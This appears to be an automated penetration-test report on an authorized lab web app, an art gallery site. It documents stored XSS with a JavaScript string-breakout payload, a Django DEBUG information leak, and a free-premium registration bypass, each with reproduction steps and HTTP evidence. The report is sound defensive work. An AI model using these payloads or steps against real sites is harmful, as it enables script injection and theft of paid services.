# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. MEDIUM — xss-stored Stored XSS: registration "name" rendered unescaped inside an inline &lt;script&gt; JS string (step3)](#finding-1)
    - [2. MEDIUM — misconfig Django DEBUG=True — technical error pages leak URLconf, project module name and internals site-wide](#finding-2)
    - [3. MEDIUM — price-tampering Premium subscription granted for free — user-controlled is_premium at registration bypasses payment/validation](#finding-3)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [4. HIGH — ssti Suspected SSTI via user 'name' rendered server-side on the preferences page](#finding-4)
    - [5. MEDIUM — rate-limit No rate limiting / brute-force protection on login endpoint](#finding-5)
    - [6. MEDIUM — xss-stored Stored XSS lead: step2 EmailField accepts script payload via RFC quoted local part](#finding-6)
    - [7. MEDIUM — vulnerable-component Outdated & EOL CPython 3.9.2 — CVE-2023-24329 / CVE-2024-6923 / CVE-2022-45061](#finding-7)
    - [8. MEDIUM — vulnerable-component Django development server (runserver / wsgiref) used in production](#finding-8)
    - [9. LOW — rate-limit No rate limiting / anti-automation on multi-step registration (mass account creation)](#finding-9)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0j8na5-gq534f` |
| Target | http://target.local:32804/ |
| Started | 2026-06-30T10:57:29.564Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 8 mapped · 8 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32804`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 3 medium

_Plus 6 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [MEDIUM] [xss-stored] Stored XSS: registration "name" rendered unescaped inside an inline &lt;script&gt; JS string (step3)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32804/

The `name` value submitted to /accounts/register/step1 is stored in the registration session (and persisted to the created account) and later rendered UNESCAPED into a JavaScript string literal inside an inline <script> block on /accounts/register/step3:

    <script>alert("Hello {{name}}. Just Now up to 50% OFF ")</script>

Because the value is not escaped for the JS-string context, a name of `");alert(document.domain);//` breaks out of the string and injects arbitrary JavaScript. Step3 then renders:

    <script>alert("Hello ");alert(document.domain);//VERDICTXSS. Just Now up to 50% OFF ")</script>

i.e. `alert(document.domain)` executes as attacker-controlled JS. Django auto-escaping (which correctly neutralised the same input when reflected into the HTML attribute of the step1 form, and refuted SSTI) is NOT applied to this inline-script sink — the template inserts `name` raw into a `<script>` context.

Scope/impact note: the confirmed execution sink (step3) renders the value within the registrant's OWN session, so as demonstrated it is self-XSS (an attacker can only inject into their own registration flow). However, the value is a PERSISTED account display name, and this sink proves the application does not sanitise `name` before placing it in an executable JS context — making cross-user/admin render sinks (dashboards, gallery attribution, admin user-management) a likely escalation. No admin role was available this run to confirm a cross-user sink; severity is set to medium pending verification of those other render points.

**Reproduction**

```
1. GET /accounts/register/step1/ and grab the csrfmiddlewaretoken (matches the csrftoken cookie).
2. POST /accounts/register/step1/ with name=`");alert(document.domain);//VERDICTXSS`, a password, and the token → 302 to step2 (name stored in session).
3. POST /accounts/register/step2/ with any email → 302 to step3.
4. GET /accounts/register/step3/ → the inline <script> renders: alert("Hello ");alert(document.domain);//VERDICTXSS. ...") — the JS string is broken and alert(document.domain) executes.
Negative control: storing a benign name (e.g. VerdictBenignName) renders alert("Hello VerdictBenignName. ...") with no breakout. Positive replays: the breakout payload reflects unescaped on two consecutive step3 GETs (stable).
```

**Evidence**

- Evidence `ev-mr0k99h3-1q` — `artifacts/s-0002/ev-mr0k99h3-1q/`

Request:

```http
GET /accounts/register/step3/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1728
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:25:57 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Step 3</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
    </nav>  
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Step 3: Subscription</h2>
                <form method="post">
                    <input type="hidden" name="csrfmiddlewaretoken" value="X3vDXEliNRKGyMeNU8Yn7fhRTZsvEU0dZ1Vaf0HvrGjQN3xCi272dbDpuUcBtGbZ">
                    <div class="form-group">
                        <label for="id_is_premium">Subscribe to premium:</label>
                        <input type="checkbox" name="is_premium" id="id_is_premium">
                    </div>
                    <button type="submit" class="btn btn-primary">Complete Registration</button>
                </form>
            </div>  
        </div>      
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script>alert("Hello VerdictBenignName. Just Now up to 50% OFF ")</script>
</body>
</html>
```

- Evidence `ev-mr0k9n4y-1s` — `artifacts/s-0002/ev-mr0k9n4y-1s/`

Request:

```http
GET /accounts/register/step3/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1749
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:26:15 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Step 3</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
    </nav>  
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Step 3: Subscription</h2>
                <form method="post">
                    <input type="hidden" name="csrfmiddlewaretoken" value="9OoYeiUn5YKmMCuORWpsJFZ6jkx7g31ubMOvwEgAJNjw1TNDfQy7PBlEUfhd5Pcg">
                    <div class="form-group">
                        <label for="id_is_premium">Subscribe to premium:</label>
                        <input type="checkbox" name="is_premium" id="id_is_premium">
                    </div>
                    <button type="submit" class="btn btn-primary">Complete Registration</button>
                </form>
            </div>  
        </div>      
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script>alert("Hello ");alert(document.domain);//VERDICTXSS. Just Now up to 50% OFF ")</script>
</body>
</html>
```

- Evidence `ev-mr0k9vqa-1t` — `artifacts/s-0002/ev-mr0k9vqa-1t/`

Request:

```http
GET /accounts/register/step3/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 1749
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:26:26 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
set-cookie: <redacted>
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register - Step 3</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <nav class="navbar navbar-dark bg-dark">
        <a class="navbar-brand" href="#">Art Gallery</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
        </button>
    </nav>  
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h2>Step 3: Subscription</h2>
                <form method="post">
                    <input type="hidden" name="csrfmiddlewaretoken" value="3uky0aGRf2Mhu0jZZdenKr4cNuNxlaqA5sK5iw24TRlrJhCOn7n2QnqKopxDaWBm">
                    <div class="form-group">
                        <label for="id_is_premium">Subscribe to premium:</label>
                        <input type="checkbox" name="is_premium" id="id_is_premium">
                    </div>
                    <button type="submit" class="btn btn-primary">Complete Registration</button>
                </form>
            </div>  
        </div>      
    </div>

    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
    <script>alert("Hello ");alert(document.domain);//VERDICTXSS. Just Now up to 50% OFF ")</script>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [MEDIUM] [misconfig] Django DEBUG=True — technical error pages leak URLconf, project module name and internals site-wide

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32804/

The application runs with Django DEBUG=True in a deployed environment. Any request to a non-existent path returns Django's technical 404 page, which discloses the URLconf module name (`ssti_debug_art_gallery.urls`) and the full ordered list of URL patterns; CSRF failures and unhandled exceptions likewise return verbose debug pages. This leaks internal application structure, project/module names, and (on unhandled exceptions) can expose full stack traces and settings values including SECRET_KEY — aiding further exploitation. This is a cross-cutting/site-wide misconfiguration, surfaced here while diagnosing /accounts/preferences. Negative control (a normal 200 page) contains none of this debug output.

**Reproduction**

```
GET any non-existent path, e.g. http://target.local:32804/accounts/nonexistent-debug-probe-xyz/ → HTTP 404 technical page containing "Using the URLconf defined in ssti_debug_art_gallery.urls" and the URL pattern list. Compare to a valid page (GET /accounts/preferences/ → 200) which has no such output. Reproducible across paths.
```

**Evidence**

- Evidence `ev-mr0koo2i-35` — `artifacts/s-0005/ev-mr0koo2i-35/`

Request:

```http
GET /accounts/preferences/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 2684
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:37:56 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Preferences</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        input {
          width: 100%;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 20px;
        }
        .gallery-item {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
        }
        .gallery-item img {
            max-width: 100%;
            height: auto;
        }
    </style>
    
    
</head>
<body>
        
    

<nav class="navbar navbar-dark bg-dark">
    <a class="navbar-brand" href="#">Art Gallery</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
    </button>
    
    <div class="collapse navbar-collapse" id="navbarsExample01">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
            <a class="nav-link" href="/">Home</a>
            </li>
            <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="dropdown01" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</a>
            <div class="dropdown-menu" aria-labelledby="dropdown01">
                <a class="dropdown-item" href="/accounts/preferences">My settings<span class="sr-only">(current)</span></a>
                <a class="dropdown-item disabled" href="#">Buy Art</a>
                <a class="dropdown-item disabled" href="#">Sell Art(Only Premiun Accounts)</a>
                <a class="dropdown-item" href="/accounts/logout">Logout</a>
            </div>
            </li>
        </ul>
        <form class="form-inline my-2 my-md-0">
            <input class="form-control" type="text" placeholder="Search" aria-label="Search">
        </form>
    </div>
</nav>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h2>Preferences</h2>
            <p>Name: test@test.com</p>
            <p>Premium Subscriber: False</p>
            
        </div>
    </div>
</div>



    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr0kuuy9-3h` — `artifacts/s-0005/ev-mr0kuuy9-3h/`

Request:

```http
GET /accounts/preferences/2/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
content-length: 3587
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:42:45 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /accounts/preferences/2/</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32804/accounts/preferences/2/</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>ssti_debug_art_gallery.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                accounts/
                
            
                register/step1/
                [name='register_step1']
            
          </li>
        
          <li>
            
                accounts/
                
            
                register/step2/
                [name='register_step2']
            
          </li>
        
          <li>
            
                accounts/
                
            
                register/step3/
                [name='register_step3']
            
          </li>
        
          <li>
            
                accounts/
                
            
                login/
                [name='login']
            
          </li>
        
          <li>
            
                accounts/
                
            
                home/
                [name='home']
            
          </li>
        
          <li>
            
                accounts/
                
            
                preferences/
                [name='preferences']
            
          </li>
        
          <li>
            
                accounts/
                
            
                logout/
                [name='logout']
            
          </li>
        
          <li>
            
                
                
            
          </li>
        
          <li>
            
                ^static/(?P&lt;path&gt;.*)$
                
            
          </li>
        
      </ol>
      <p>
        
          The current path, <code>accounts/preferences/2/</code>,
        
        didn’t match any of these.
      </p>
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

- Evidence `ev-mr0kysk2-3k` — `artifacts/s-0005/ev-mr0kysk2-3k/`

Request:

```http
GET /accounts/nonexistent-debug-probe-xyz/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
content-length: 3629
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:45:48 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Page not found at /accounts/nonexistent-debug-probe-xyz/</title>
  <meta name="robots" content="NONE,NOARCHIVE">
  <style type="text/css">
    html * { padding:0; margin:0; }
    body * { padding:10px 20px; }
    body * * { padding:0; }
    body { font:small sans-serif; background:#eee; color:#000; }
    body>div { border-bottom:1px solid #ddd; }
    h1 { font-weight:normal; margin-bottom:.4em; }
    h1 span { font-size:60%; color:#666; font-weight:normal; }
    table { border:none; border-collapse: collapse; width:100%; }
    td, th { vertical-align:top; padding:2px 3px; }
    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
    #info { background:#f6f6f6; }
    #info ol { margin: 0.5em 4em; }
    #info ol li { font-family: monospace; }
    #summary { background: #ffc; }
    #explanation { background:#eee; border-bottom: 0px none; }
    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
  </style>
</head>
<body>
  <div id="summary">
    <h1>Page not found <span>(404)</span></h1>
    
    <table class="meta">
      <tr>
        <th>Request Method:</th>
        <td>GET</td>
      </tr>
      <tr>
        <th>Request URL:</th>
        <td>http://target.local:32804/accounts/nonexistent-debug-probe-xyz/</td>
      </tr>
      
    </table>
  </div>
  <div id="info">
    
      <p>
      Using the URLconf defined in <code>ssti_debug_art_gallery.urls</code>,
      Django tried these URL patterns, in this order:
      </p>
      <ol>
        
          <li>
            
                accounts/
                
            
                register/step1/
                [name='register_step1']
            
          </li>
        
          <li>
            
                accounts/
                
            
                register/step2/
                [name='register_step2']
            
          </li>
        
          <li>
            
                accounts/
                
            
                register/step3/
                [name='register_step3']
            
          </li>
        
          <li>
            
                accounts/
                
            
                login/
                [name='login']
            
          </li>
        
          <li>
            
                accounts/
                
            
                home/
                [name='home']
            
          </li>
        
          <li>
            
                accounts/
                
            
                preferences/
                [name='preferences']
            
          </li>
        
          <li>
            
                accounts/
                
            
                logout/
                [name='logout']
            
          </li>
        
          <li>
            
                
                
            
          </li>
        
          <li>
            
                ^static/(?P&lt;path&gt;.*)$
                
            
          </li>
        
      </ol>
      <p>
        
          The current path, <code>accounts/nonexistent-debug-probe-xyz/</code>,
        
        didn’t match any of these.
      </p>
    
  </div>

  <div id="explanation">
    <p>
      You’re seeing this error because you have <code>DEBUG = True</code> in
      your Django settings file. Change that to <code>False</code>, and Django
      will display a standard 404 page.
    </p>
  </div>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [price-tampering] Premium subscription granted for free — user-controlled is_premium at registration bypasses payment/validation

- Screen: `s-0007`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32804/

The 3-step registration wizard exposes an `is_premium` checkbox ("Subscribe to premium") on step 3 that directly sets the account's premium-subscriber flag. There is NO payment, billing, or validation step anywhere in steps 1-3. Submitting `is_premium=on` creates an account whose /accounts/preferences/ shows "Premium Subscriber: True" — obtaining the paid premium tier for free. The preferences page itself states premium is supposed to go through a validation process that "could take a few hours", so the data-level flag set is bypassing the intended paid/validation gate. The flag is fully attacker-controlled and self-asserted at registration.

**Reproduction**

```
1. GET /accounts/register/step1/ ; POST step1 with name=verdict_prem1&password=Passw0rd!23x -> 302 step2.
2. POST /accounts/register/step2/ with email=verdict_prem1@example.com -> 302 step3.
3. POST /accounts/register/step3/ with is_premium=on -> 200 "Registration Complete!" (no payment requested).
4. Log in as verdict_prem1@example.com / Passw0rd!23x ; GET /accounts/preferences/ -> "Premium Subscriber: True" (evidence ev-mr0ljmxt-4g, ev-mr0ljn60-4h, 2854 bytes).
Negative control: an account registered WITHOUT is_premium (test@test.com) -> GET /accounts/preferences/ shows "Premium Subscriber: False" (ev-mr0lembd-47, 2684 bytes).
Root cause: is_premium is a user-settable model field accepted at registration with no payment/validation enforcement (also a mass-assignment of a privileged field).
```

**Evidence**

- Evidence `ev-mr0lembd-47` — `artifacts/s-0007/ev-mr0lembd-47/`

Request:

```http
GET /accounts/preferences/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 2684
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 11:58:07 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Preferences</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        input {
          width: 100%;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 20px;
        }
        .gallery-item {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
        }
        .gallery-item img {
            max-width: 100%;
            height: auto;
        }
    </style>
    
    
</head>
<body>
        
    

<nav class="navbar navbar-dark bg-dark">
    <a class="navbar-brand" href="#">Art Gallery</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
    </button>
    
    <div class="collapse navbar-collapse" id="navbarsExample01">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
            <a class="nav-link" href="/">Home</a>
            </li>
            <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="dropdown01" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</a>
            <div class="dropdown-menu" aria-labelledby="dropdown01">
                <a class="dropdown-item" href="/accounts/preferences">My settings<span class="sr-only">(current)</span></a>
                <a class="dropdown-item disabled" href="#">Buy Art</a>
                <a class="dropdown-item disabled" href="#">Sell Art(Only Premiun Accounts)</a>
                <a class="dropdown-item" href="/accounts/logout">Logout</a>
            </div>
            </li>
        </ul>
        <form class="form-inline my-2 my-md-0">
            <input class="form-control" type="text" placeholder="Search" aria-label="Search">
        </form>
    </div>
</nav>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h2>Preferences</h2>
            <p>Name: test@test.com</p>
            <p>Premium Subscriber: False</p>
            
        </div>
    </div>
</div>



    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr0ljmxt-4g` — `artifacts/s-0007/ev-mr0ljmxt-4g/`

Request:

```http
GET /accounts/preferences/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 2854
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 12:02:01 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Preferences</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        input {
          width: 100%;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 20px;
        }
        .gallery-item {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
        }
        .gallery-item img {
            max-width: 100%;
            height: auto;
        }
    </style>
    
    
</head>
<body>
        
    

<nav class="navbar navbar-dark bg-dark">
    <a class="navbar-brand" href="#">Art Gallery</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
    </button>
    
    <div class="collapse navbar-collapse" id="navbarsExample01">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
            <a class="nav-link" href="/">Home</a>
            </li>
            <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="dropdown01" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</a>
            <div class="dropdown-menu" aria-labelledby="dropdown01">
                <a class="dropdown-item" href="/accounts/preferences">My settings<span class="sr-only">(current)</span></a>
                <a class="dropdown-item disabled" href="#">Buy Art</a>
                <a class="dropdown-item disabled" href="#">Sell Art(Only Premiun Accounts)</a>
                <a class="dropdown-item" href="/accounts/logout">Logout</a>
            </div>
            </li>
        </ul>
        <form class="form-inline my-2 my-md-0">
            <input class="form-control" type="text" placeholder="Search" aria-label="Search">
        </form>
    </div>
</nav>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h2>Preferences</h2>
            <p>Name: verdict_prem1@example.com</p>
            <p>Premium Subscriber: True</p>
            
            <p>This account is in process to access premium subscription</p>
            <p>The validation process could take a few hours ... </p>
            
        </div>
    </div>
</div>



    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr0ljn60-4h` — `artifacts/s-0007/ev-mr0ljn60-4h/`

Request:

```http
GET /accounts/preferences/ HTTP/1.1
Host: target.local:32804
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
content-length: 2854
content-type: text/html; charset=utf-8
cross-origin-opener-policy: same-origin
date: Tue, 30 Jun 2026 12:02:01 GMT
referrer-policy: same-origin
server: WSGIServer/0.2 CPython/3.9.2
vary: Cookie
x-content-type-options: nosniff
x-frame-options: DENY

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Preferences</title>
    <!-- Bootstrap CSS -->
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <style>
        input {
          width: 100%;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 20px;
        }
        .gallery-item {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: center;
        }
        .gallery-item img {
            max-width: 100%;
            height: auto;
        }
    </style>
    
    
</head>
<body>
        
    

<nav class="navbar navbar-dark bg-dark">
    <a class="navbar-brand" href="#">Art Gallery</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExample01" aria-controls="navbarsExample01" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
    </button>
    
    <div class="collapse navbar-collapse" id="navbarsExample01">
        <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
            <a class="nav-link" href="/">Home</a>
            </li>
            <li class="nav-item dropdown">
            <a class="nav-link dropdown-toggle" href="#" id="dropdown01" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Actions</a>
            <div class="dropdown-menu" aria-labelledby="dropdown01">
                <a class="dropdown-item" href="/accounts/preferences">My settings<span class="sr-only">(current)</span></a>
                <a class="dropdown-item disabled" href="#">Buy Art</a>
                <a class="dropdown-item disabled" href="#">Sell Art(Only Premiun Accounts)</a>
                <a class="dropdown-item" href="/accounts/logout">Logout</a>
            </div>
            </li>
        </ul>
        <form class="form-inline my-2 my-md-0">
            <input class="form-control" type="text" placeholder="Search" aria-label="Search">
        </form>
    </div>
</nav>
<div class="container mt-5">
    <div class="row justify-content-center">
        <div class="col-md-6">
            <h2>Preferences</h2>
            <p>Name: verdict_prem1@example.com</p>
            <p>Premium Subscriber: True</p>
            
            <p>This account is in process to access premium subscription</p>
            <p>The validation process could take a few hours ... </p>
            
        </div>
    </div>
</div>



    <!-- Bootstrap JS and dependencies -->
    <script src="/static/js/jquery-3.5.1.slim.min.js"></script>
    <script src="/static/js/popper.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script>
</body>
</html>
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-4"></a>

### 4. [SUSPECTED] [HIGH] [ssti] Suspected SSTI via user 'name' rendered server-side on the preferences page

- Screen: `s-0005`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32804/

**Anomaly (why this is a lead):** DEBUG 404 leaked the Django project module name 'ssti_debug_art_gallery' (ssti+debug = named intended bugs); the user-controlled 'name' is rendered server-side on the preferences page and is already a confirmed injection sink at register/step1 — a strong SSTI lead, but the read-only preferences screen offers no injection point so it cannot be confirmed from here.

